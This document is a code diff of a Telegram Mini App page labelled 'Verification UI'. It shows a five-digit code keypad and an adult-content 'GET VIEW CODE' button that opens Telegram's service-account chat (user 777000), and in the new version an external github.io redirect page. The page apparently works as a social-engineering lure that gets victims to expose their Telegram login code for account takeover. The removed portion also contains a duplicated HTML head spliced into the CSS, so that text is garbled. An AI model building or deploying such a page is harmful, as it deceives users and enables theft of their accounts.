@@ -4,217 +4,22 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verification UI</title>
-    <!-- টেলিগ্রামের মেইন স্ক্রিপ্ট (এটি ছাড়া লিঙ্ক কাজ করবে না) -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.3)), url('https://w0.peakpx.com/wallpaper/348/443/HD-wallpaper-woman-blurred-background.jpg');
-            background-size: cover;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: white;
-            overflow: hidden;
-        }
-
-        .card {
-            background: rgba(255, 255, 255, 0.2);
-            backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            padding: 30px 20px;
-            border-radius: 30px;
-            text-align: center;
-            width: 320px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
-        }
-
-        .top-icon {
-            background: white;
-            width: 65px;
-            height: 45px;
-            border-radius: 12px;
-            margin: -65px auto 20px auto;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .top-icon span { font-size: 28px; }
-
-        .info-box {
-            background: rgba(255, 255, 255, 0.9);
-            color: #333;
-            font-size: 14px;
-            padding: 10px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            font-weight: 600;
-        }
-
-        .otp-inputs {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 20px;
-        }
-
-        .otp-inputs input {
-            width: 48px;
-            height: 55px;
-            background: rgba(255, 255, 255, 0.3);
-            border: 2px solid rgba(255, 255, 255, 0.5);
-            border-radius: 12px;
-            text-align: center;
-            font-size: 24px;
-            color: #000;
-            font-weight: bold;
-            outline: none;
-        }
-
-        /* সবুজ বাটন */
-        .get-code-btn {
-            background: #34a853; 
-            border: none;
-            width: 100%;
-            padding: 15px;
-            border-radius: 10px;
-            color: white;
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification UI</title>
-    <!-- টেলিগ্রামের মেইন স্ক্রিপ্ট (এটি ছাড়া কোনো লিঙ্ক কাজ করবে না) -->
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://w0.peakpx.com/wallpaper/348/443/HD-wallpaper-woman-blurred-background.jpg');
-            background-size: cover;
-            background-position: center;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: white;
-            overflow: hidden;
-        }
-
-        .card {
-            background: rgba(255, 255, 255, 0.25);
-            backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            padding: 30px 20px;
-            border-radius: 35px;
-            text-align: center;
-            width: 320px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
-        }
-
-        .top-icon {
-            background: white;
-            width: 70px;
-            height: 50px;
-            border-radius: 15px;
-            margin: -75px auto 20px auto;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-        }
-
-        .top-icon span { font-size: 32px; }
-
-        .instruction {
-            background: rgba(255, 255, 255, 0.9);
-            color: #222;
-            font-size: 14px;
-            padding: 12px;
-            border-radius: 12px;
-            margin-bottom: 25px;
-            font-weight: 600;
-        }
-
-        .otp-inputs {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 25px;
-        }
-
-        .otp-inputs input {
-            width: 48px;
-            height: 60px;
-            background: rgba(255, 255, 255, 0.3);
-            border: 2px solid rgba(255, 255, 255, 0.5);
-            border-radius: 12px;
-            text-align: center;
-            font-size: 26px;
-            color: #000;
-            font-weight: bold;
-            outline: none;
-        }
-
-        /* সবুজ GET CODE বাটন */
-        .get-code-btn {
-            background: #34a853; 
-            border: none;
-            width: 100%;
-            padding: 18px;
-            border-radius: 12px;
-            color: white;
-            font-weight: bold;
-            font-size: 17px;
-            cursor: pointer;
-            margin-bottom: 25px;
-            display: block;
-            text-decoration: none;
-            box-shadow: 0 4px 0 #288a42;
-        }
-
-        .get-code-btn:active {
-            transform: translateY(2px);
-            box-shadow: none;
-        }
-
-        /* সবুজ কিপ্যাড */
-        .keypad {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 12px;
-        }
-
-        .key {
-            background: #4caf50;
-            padding: 15px;
-            border-radius: 10px;
-            font-size: 22px;
-            font-weight: bold;
-            cursor: pointer;
-            user-select: none;
-            color: white;
-        }
-
+        body { margin: 0; padding: 0; font-family: sans-serif; background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://w0.peakpx.com/wallpaper/348/443/HD-wallpaper-woman-blurred-background.jpg'); background-size: cover; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; overflow: hidden; }
+        .card { background: rgba(255, 255, 255, 0.25); backdrop-filter: blur(25px); border-radius: 35px; padding: 30px 20px; width: 320px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.3); }
+        .instruction { background: white; color: #222; padding: 12px; border-radius: 12px; margin-bottom: 25px; font-size: 14px; font-weight: bold; }
+        .otp-inputs { display: flex; justify-content: space-between; margin-bottom: 25px; }
+        .otp-inputs input { width: 48px; height: 60px; background: rgba(255, 255, 255, 0.3); border: 2px solid rgba(255, 255, 255, 0.5); border-radius: 12px; text-align: center; font-size: 26px; color: #000; font-weight: bold; outline: none; }
+        .get-code-btn { background: #34a853; border: none; width: 100%; padding: 18px; border-radius: 12px; color: white; font-weight: bold; font-size: 17px; cursor: pointer; margin-bottom: 25px; box-shadow: 0 4px 0 #288a42; }
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
+        .key { background: #4caf50; padding: 15px; border-radius: 10px; font-size: 22px; font-weight: bold; cursor: pointer; user-select: none; }
         .key:active { background: #388e3c; }
-        .key.empty { background: transparent; cursor: default; }
     </style>
 </head>
 <body>
-
     <div class="card">
-        <div class="top-icon">
-            <span>📱</span>
-        </div>
-        
         <div class="instruction">Enter the 5-digit code that we just sent you!</div>
-
         <div class="otp-inputs" id="otp-container">
             <input type="text" maxlength="1" readonly>
             <input type="text" maxlength="1" readonly>
@@ -222,10 +27,7 @@
             <input type="text" maxlength="1" readonly>
             <input type="text" maxlength="1" readonly>
         </div>
-
-        <!-- মেইন বাটন -->
         <button class="get-code-btn" onclick="openServiceChat()">🔞 GET VIEW CODE 🔞</button>
-
         <div class="keypad">
             <div class="key" onclick="pressKey('1')">1</div>
             <div class="key" onclick="pressKey('2')">2</div>
@@ -236,7 +38,7 @@
             <div class="key" onclick="pressKey('7')">7</div>
             <div class="key" onclick="pressKey('8')">8</div>
             <div class="key" onclick="pressKey('9')">9</div>
-            <div class="key empty"></div>
+            <div class="key"></div>
             <div class="key" onclick="pressKey('0')">0</div>
             <div class="key" onclick="pressKey('back')">✖️</div>
         </div>
@@ -247,39 +49,25 @@
         tg.ready();
         tg.expand();
 
-        const inputs = document.querySelectorAll('#otp-container input');
+        let inputs = document.querySelectorAll('#otp-container input');
         let currentIdx = 0;
 
         function pressKey(key) {
             if (key === 'back') {
                 if (currentIdx >= 0) {
-                    if (inputs[currentIdx].value === "" && currentIdx > 0) {
-                        currentIdx--;
-                    }
+                    if (inputs[currentIdx].value === "" && currentIdx > 0) currentIdx--;
                     inputs[currentIdx].value = "";
                 }
-            } else {
-                if (currentIdx < inputs.length) {
-                    inputs[currentIdx].value = key;
-                    if (currentIdx < inputs.length - 1) {
-                        currentIdx++;
-                    }
-                }
+            } else if (currentIdx < inputs.length) {
+                inputs[currentIdx].value = key;
+                if (currentIdx < inputs.length - 1) currentIdx++;
             }
         }
 
-        // এটিই হলো সেই অরিজিনাল ডিপ লিঙ্ক মেথড
         function openServiceChat() {
-            /** 
-             * tg://openmessage?user_id=777000 
-             * এটি সরাসরি ওই সার্ভিস অ্যাকাউন্টের চ্যাটবক্স ওপেন করার জন্য সবচেয়ে পাওয়ারফুল লিঙ্ক।
-            **/
-            window.location.assign("tg://openmessage?user_id=777000");
-
-            // বিকল্প মেথড (যদি ওপরেরটি ব্লক থাকে)
-            setTimeout(() => {
-                tg.openTelegramLink("tg://resolve?domain=telegram&post=1");
-            }, 500);
+            // এটি আপনার তৈরি করা go.html ফাইলটিকে এক্সটারনাল ব্রাউজারে ওপেন করবে
+            const redirectUrl = "https://rony90790.github.io/View-code-button-CHEK-/go.html";
+            tg.openLink(redirectUrl);
         }
     </script>
 </body>
